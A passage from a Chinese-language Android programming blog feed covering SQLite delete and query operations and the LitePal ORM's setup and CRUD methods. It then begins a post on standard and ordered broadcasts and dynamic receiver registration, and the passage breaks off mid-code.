srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200929160447803"></p><h6 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h6><p><code>db.delete(&quot;Book&quot;,&quot;pages &gt; ?&quot;,new String[]&#123;&quot;500&quot;&#125;);</code></p><p>删除数据主要通过<code>db.delete( )</code>方法进行一个操作，第一个参数是表名，第二个参数是条件，跟修改数据差不多是为了找到数据条的位置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">delete_data.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        SQLiteDatabase db=dbhelper.getWritableDatabase();</span><br><span class="line">        db.delete(<span class="string">&quot;Book&quot;</span>,<span class="string">&quot;pages &gt; ?&quot;</span>,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;500&quot;</span>&#125;);</span><br><span class="line">        Toast.makeText(MainActivity.<span class="keyword">this</span>,<span class="string">&quot;删除数据成功&quot;</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200929161554039.png" class="lazyload" data-srcset="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200929161554039.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200929161554039"><img src="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200929162019910.png" class="lazyload" data-srcset="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200929162019910.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200929162019910"></p><p><img src="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200929163526668.png" class="lazyload" data-srcset="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200929163526668.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200929163526668"></p><h6 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h6><p>SQLiteDatabase中提供了一个query( )方法用于对数据进行查询，这个方法的参数非常复杂，最短的一个方法重载也需要传入7个参数。</p><p>第一个参数表名；</p><p>第二个参数指定用于查询哪几列，如果不指定则默认查询所有列；</p><p>第三、第四个参数用于约束查询某一行或某几行的数据，不指定则默认查询所有的行数据；</p><p>第五个参数用于指定需要group by的列，不指定则表示不对查询结果进行group by操作；</p><p>第七个参数用于指定查询结果的排列方式，不指定则表示使用默认的排序方式</p><p><img src="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200929183346145.png" class="lazyload" data-srcset="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200929183346145.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200929183346145"></p><p>调用query( )方法会返回一个Cursor对象，查询到所有的数据都将从这个对象中取出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">query_data.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        SQLiteDatabase db=dbhelper.getWritableDatabase();</span><br><span class="line">        Cursor cursor=db.query(<span class="string">&quot;Book&quot;</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">           <span class="keyword">if</span>(cursor.moveToFirst())&#123;</span><br><span class="line">               <span class="keyword">do</span>&#123;</span><br><span class="line">                   String id=cursor.getString(cursor.getColumnIndex(<span class="string">&quot;id&quot;</span>));</span><br><span class="line">                   String author=cursor.getString(cursor.getColumnIndex(<span class="string">&quot;author&quot;</span>));</span><br><span class="line">                   String price=cursor.getString(cursor.getColumnIndex(<span class="string">&quot;price&quot;</span>));</span><br><span class="line">                   String pages=cursor.getString(cursor.getColumnIndex(<span class="string">&quot;pages&quot;</span>));</span><br><span class="line">                   String name=cursor.getString(cursor.getColumnIndex(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">                   Toast.makeText(MainActivity.<span class="keyword">this</span>,id+<span class="string">&quot; &quot;</span>+author+<span class="string">&quot; &quot;</span>+price+<span class="string">&quot; &quot;</span>+pages+<span class="string">&quot; &quot;</span>+name,Toast.LENGTH_SHORT).show();</span><br><span class="line">               &#125;<span class="keyword">while</span> (cursor.moveToNext());</span><br><span class="line">           &#125;</span><br><span class="line">           cursor.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>首先获取一个SQLiteDatabase对象，然后使用<code>db.query( )</code>方法将数据存在一个Cursor对象，最后对Cursor进行处理， <code>cursor.moveToFirst( )</code>方法将指针移到第一个数据，<code>cursor.getString(cursor.getColumnIndex(&quot;id&quot;))</code>获取数据是列索引为id的数据，一行一行去读数据通过方法<code>cursor.moveToNext()</code>实现，最后 <code>cursor.close()</code>关闭该对象<img src="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200929184654029.png" class="lazyload" data-srcset="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200929184654029.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200929184654029"></p><h2 id="使用SQL语言操作数据库"><a href="#使用SQL语言操作数据库" class="headerlink" title="使用SQL语言操作数据库"></a>使用SQL语言操作数据库</h2><p><img src="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200929184829755.png" class="lazyload" data-srcset="/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/image-20200929184829755.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200929184829755"></p><h2 id="使用LitePal操作数据库"><a href="#使用LitePal操作数据库" class="headerlink" title="使用LitePal操作数据库"></a>使用LitePal操作数据库</h2><p>LitePal是一款开源的Android数据库框架,它采用了对象关系映射(ORM)的模式,并将我们平时开发最常用到的一些数据库功能进行了封装,使得不用编写一行SQL语句就可以完成各种建表和增删改查的操作，并且LitePal很“轻”，jar包大小不到100k，而且近乎零配置，这一点和Hibernate这类的框架有很大区别。</p><p>1.添加依赖</p><p>在app/build.gradle文件中添加依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line">    implementation &#x27;org.litepal.guolindev:core:3.2.2&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 然后在主注册文件中&lt;application&gt;标签内添加一行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android:name=&quot;org.litepal.LitePalApplication&quot;</span><br></pre></td></tr></table></figure><p>在assets目录下创建一个litepal.xml配置文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">litepal</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dbname</span> <span class="attr">value</span>=<span class="string">&quot;demo&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapping</span> <span class="attr">class</span>=<span class="string">&quot;com.example.litepaltest.Album&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapping</span> <span class="attr">class</span>=<span class="string">&quot;com.example.litepaltest.Song&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">litepal</span>&gt;</span></span><br></pre></td></tr></table></figure><p>verson为版本号，若对数据表的结构有进行更新的话，添加版本号1-&gt;2，list中为两个数据表，<strong>路径一定要搞对</strong>，</p><p>最后在活动的创建中加入一行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitePal.initialize(<span class="keyword">this</span>);</span><br></pre></td></tr></table></figure><p>2.创建实体类，一般继承LitePalSupport，不能包含List类型的属性</p><h6 id="litepal支持的实体类字段映射类型为-int，long，double，float，byte-，boolean，String，Date；不支持String-数组型"><a href="#litepal支持的实体类字段映射类型为-int，long，double，float，byte-，boolean，String，Date；不支持String-数组型" class="headerlink" title="litepal支持的实体类字段映射类型为 int，long，double，float，byte[]，boolean，String，Date；不支持String[]数组型"></a>litepal支持的实体类字段映射类型为 int，long，double，float，byte[]，boolean，String，Date；不支持String[]数组型</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Movie</span> <span class="keyword">extends</span> <span class="title">LitePalSupport</span></span>&#123;    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="comment">//name是唯一的，且默认值为unknown </span></span><br><span class="line">    <span class="meta">@Column(unique = true, defaultValue = &quot;unknown&quot;)</span> </span><br><span class="line">    <span class="keyword">private</span> String name; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//忽略即 不在数据库中创建该属性对应的字段 </span></span><br><span class="line">    <span class="meta">@Column(ignore = true)</span> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">float</span> price; </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">byte</span>[] cover; </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> duration; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//不为空 </span></span><br><span class="line">    <span class="meta">@Column(nullable = false)</span> </span><br><span class="line">    <span class="keyword">private</span> String director; </span><br><span class="line">    <span class="keyword">private</span> String type; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//记得添加所有字段的getter和setter方法 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中id这个字段可写可不写，因为即使不写这个字段，LitePal也会在表中自动生成一个id列，毕竟每张表都一定要有主键的， 即不管实体类中有没有id这个属性，都会默认创建一个为整型的id字段，作为自增的主键。</p><p>3.存储操作</p><p>实例一个对象，然后对象进行一个赋值，最后用对象.save( )方法进行一个保存。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">album.save();</span><br><span class="line">Song song1 = <span class="keyword">new</span> Song();</span><br><span class="line">song1.setName(<span class="string">&quot;song1&quot;</span>);</span><br><span class="line">song1.setDuration(<span class="number">320</span>);</span><br><span class="line">song1.setAlbum(album);</span><br><span class="line">song1.save();</span><br></pre></td></tr></table></figure><p>4.删除操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 删除单个记录，id=1</span></span><br><span class="line">LitePal.delete(Movie.class,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除数据库中movie表的所有记录 </span></span><br><span class="line">LitePal.deleteAll(Movie.class); </span><br><span class="line"></span><br><span class="line"><span class="comment">//删除数据库movie表中duration大于3500的记录 </span></span><br><span class="line">LitePal.deleteAll(Movie.class, <span class="string">&quot;duration &gt; ?&quot;</span> , <span class="string">&quot;3500&quot;</span>); </span><br></pre></td></tr></table></figure><p>5.修改操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第一步，查找id为1的记录 </span></span><br><span class="line">Movie movie = LitePal.find(Movie.class, <span class="number">1</span>); </span><br><span class="line"><span class="comment">//第二步，改变某个字段的值 </span></span><br><span class="line">movie.setPrice(<span class="number">4020f</span>); </span><br><span class="line"><span class="comment">//第三步，保存数据 </span></span><br><span class="line">movie.save(); </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Movie movie=<span class="keyword">new</span> Movie(); </span><br><span class="line">movie.setName(<span class="string">&quot;2Diots&quot;</span>); </span><br><span class="line">movie.setDirector(<span class="string">&quot;某人&quot;</span>);</span><br><span class="line"> <span class="comment">//直接更新id为1的记录 </span></span><br><span class="line"> movie.update(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Movie movie=<span class="keyword">new</span> Movie(); </span><br><span class="line">movie.setDirector(<span class="string">&quot;someone&quot;</span>); </span><br><span class="line"><span class="comment">//更新所有name为2Diots的记录,将director字段设为someone </span></span><br><span class="line">movie.updateAll(<span class="string">&quot;name = ?&quot;</span>, <span class="string">&quot;2Diots&quot;</span>);</span><br><span class="line"></span><br><span class="line">Movie movie=<span class="keyword">new</span> Movie(); </span><br><span class="line">movie.setName(<span class="string">&quot;someone&quot;</span>); </span><br><span class="line">movie.setDirector(<span class="string">&quot;someone&quot;</span>); </span><br><span class="line"><span class="comment">//将更新所有name为2Diots，director为gpf的记录name和director均改为someone</span></span><br><span class="line">movie.updateAll(<span class="string">&quot;name=? and director=?&quot;</span>, <span class="string">&quot;2Diots&quot;</span>，<span class="string">&quot;gpf&quot;</span>);</span><br></pre></td></tr></table></figure><p>6.查询操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//查找movie表的所有记录，返回值是一个泛型为Movie的List集合</span></span><br><span class="line">List&lt;Movie&gt; allMovies = LitePal.findAll(Movie.class); </span><br><span class="line"></span><br><span class="line"><span class="comment">//查找movie表id为1的记录 </span></span><br><span class="line">Movie movie = LitePal.find(Movie.class,<span class="number">1</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 比如获取news表中的第一条数据</span></span><br><span class="line">News firstNews = LitePal.findFirst(News.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取News表中的最后一条数据</span></span><br><span class="line">News lastNews = LitePal.findLast(News.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 想把news表中id为1、3、5、7的数据都查出来</span></span><br><span class="line">List&lt;News&gt; newsList = LitePal.findAll(News.class, <span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>);</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"><span class="keyword">long</span>[] ids = <span class="keyword">new</span> <span class="keyword">long</span>[] &#123; <span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span> &#125;;</span><br><span class="line">List&lt;News&gt; newsList = LitePal.findAll(News.class, ids);</span><br><span class="line"></span><br><span class="line"><span class="comment">//查找name为2Diots的记录,并且以时长作排序，where()方法接收任意个字符串参数，其中第一个参数用于进行条件约束，</span></span><br><span class="line"><span class="comment">//从第二个参数开始，都是用于替换第一个参数中的占位符的。那这个where()方法就对应了一条SQL语句中的where部分。 </span></span><br><span class="line">List&lt;Movie&gt; movies = LitePal.where(<span class="string">&quot;name = ?&quot;</span>, <span class="string">&quot;2Diots&quot;</span>).order(<span class="string">&quot;duration&quot;</span>).find(Movie.class); </span><br><span class="line"><span class="comment">// 但是这样会将news表中所有的列都查询出来，也许你并不需要那么多的数据，而是只要title和content这两列数据。那么也很简单，我们只要再增加一个连缀就行了，如下所示：</span></span><br><span class="line">List&lt;News&gt; newsList = LitePal.select(<span class="string">&quot;title&quot;</span>, <span class="string">&quot;content&quot;</span>).where(<span class="string">&quot;commentcount &gt; ?&quot;</span>, <span class="string">&quot;0&quot;</span>).find(News.class);</span><br><span class="line"><span class="comment">//将查询出的新闻按照发布的时间倒序排列，即最新发布的新闻放在最前面，那就可以这样写：</span></span><br><span class="line">List&lt;News&gt; newsList = LitePal.select(<span class="string">&quot;title&quot;</span>, <span class="string">&quot;content&quot;</span>).where(<span class="string">&quot;commentcount &gt; ?&quot;</span>, <span class="string">&quot;0&quot;</span>).order(<span class="string">&quot;publishdate desc&quot;</span>).find(News.class);</span><br><span class="line"><span class="comment">//order()方法中接收一个字符串参数，用于指定查询出的结果按照哪一列进行排序，asc表示正序排序，desc表示倒序排序，因此order()方法对应了一条SQL语句中的order by部分。</span></span><br><span class="line"><span class="comment">//也许你并不希望将所有条件匹配的结果一次性全部查询出来，因为这样数据量可能会有点太大了，而是希望只查询出前10条数据，那么使用连缀同样可以轻松解决这个问题，代码如下所示：</span></span><br><span class="line">List&lt;News&gt; newsList = LitePal.select(<span class="string">&quot;title&quot;</span>, <span class="string">&quot;content&quot;</span>).where(<span class="string">&quot;commentcount &gt; ?&quot;</span>, <span class="string">&quot;0&quot;</span>).order(<span class="string">&quot;publishdate desc&quot;</span>).limit(<span class="number">10</span>).find(News.class);</span><br><span class="line"><span class="comment">//limit()方法接收一个整型参数，用于指定查询前几条数据，这里指定成10，意思就是查询所有匹配结果中的前10条数据。</span></span><br><span class="line"><span class="comment">//刚才我们查询到的是所有匹配条件的前10条新闻，那么现在我想对新闻进行分页展示，翻到第二页时，展示第11到第20条新闻,只需要再连缀一个偏移量就可以了，如下所示：</span></span><br><span class="line">List&lt;News&gt; newsList = LitePal.select(<span class="string">&quot;title&quot;</span>, <span class="string">&quot;content&quot;</span>).where(<span class="string">&quot;commentcount &gt; ?&quot;</span>, <span class="string">&quot;0&quot;</span>).order(<span class="string">&quot;publishdate desc&quot;</span>).limit(<span class="number">10</span>).offset(<span class="number">10</span>).find(News.class);</span><br><span class="line"><span class="comment">//这里指定成10，就表示偏移十个位置，那么原来是查询前10条新闻的，偏移了十个位置之后，就变成了查询第11到第20条新闻了，如果偏移量是20，那就表示查询第21到第30条新闻</span></span><br><span class="line"><span class="comment">//查找所有年龄小于25岁的人</span></span><br><span class="line">List&lt;Person&gt; person = LitePal.where(<span class="string">&quot;age &lt; ?&quot;</span>, <span class="number">25</span>).find(Person.class); </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android-广播机制</title>
      <link href="/2020/09/24/Android/Android-%E5%B9%BF%E6%92%AD%E6%9C%BA%E5%88%B6/"/>
      <url>/2020/09/24/Android/Android-%E5%B9%BF%E6%92%AD%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="广播机制"><a href="#广播机制" class="headerlink" title="广播机制"></a>广播机制</h1><p><strong>标准广播</strong></p><p>标准广播是一种完全异步执行的而广播，在广播发出之后，所有的广播接收器几乎都在同一个时候接受到这条广播消息，因此它们之前没有任何先后顺序，这种广播的效率都会比较高，但同时也意味同时无法截断。</p><p><img src="/2020/09/24/Android/Android-%E5%B9%BF%E6%92%AD%E6%9C%BA%E5%88%B6/image-20200924185323721.png" class="lazyload" data-srcset="/2020/09/24/Android/Android-%E5%B9%BF%E6%92%AD%E6%9C%BA%E5%88%B6/image-20200924185323721.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200924185323721"></p><p><strong>有序广播</strong></p><p>有序广播是一种同步执行的广播，在广播发出之后，同一个时候只有一个广播接收器能够收到这个条广播消息，当这个广播接收器中的逻辑执行完毕后，广播才会继续传递。此时接收器是有先后顺序，优先级高德广播接收器可以先收到广播消息，并且前面的广播接收器还可以截断正在进行传递的广播。</p><p><img src="/2020/09/24/Android/Android-%E5%B9%BF%E6%92%AD%E6%9C%BA%E5%88%B6/image-20200924185335297.png" class="lazyload" data-srcset="/2020/09/24/Android/Android-%E5%B9%BF%E6%92%AD%E6%9C%BA%E5%88%B6/image-20200924185335297.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200924185335297"></p><h1 id="接收系统广播"><a href="#接收系统广播" class="headerlink" title="接收系统广播"></a>接收系统广播</h1><p>Android内置了很多系统界别的广播，在应用程序中通过监听这些广播来得到各种系统的状态信息，比如手机开机完成后发出一条广播，电池的变量发生变化会发出一条广播等等，如果想要接受这些广播，就需要使用广播接受器。</p><h2 id="动态注册监听网络变化"><a href="#动态注册监听网络变化" class="headerlink" title="动态注册监听网络变化"></a><strong>动态注册监听网络变化</strong></h2><p>广播接收器可以自由地对自己感兴趣的广播进行注册，这样当有相应的广播发出时，广播接收器就能够接收到该广播，并在内部处理相应的逻辑，注册广播的方式有两种</p><p>1.在代码中注册·····动态注册</p><p>2.在AndroidManifest.xml中注册····静态注册</p><p><strong>创建广播接收器</strong></p><p>1.创建一个类，继承BroadcastReceiver</p><p>2.重写父类的onReceive( )方法</p><p><strong>动态注册监听网络变化</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.temp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.content.IntentFilter;</span><br><span class="line"><span class="keyword">import</span> android.icu.text.UnicodeSetSpanner;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> IntentFilter intentFilter;</span><br><span class="line">    <span class="comment">//新建一个广播接收器</span></span><br><span class="line">    <span class="keyword">private</span> NetworkChangeReceiver networkChangeReceiver;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);、</span><br><span class="line">            <span 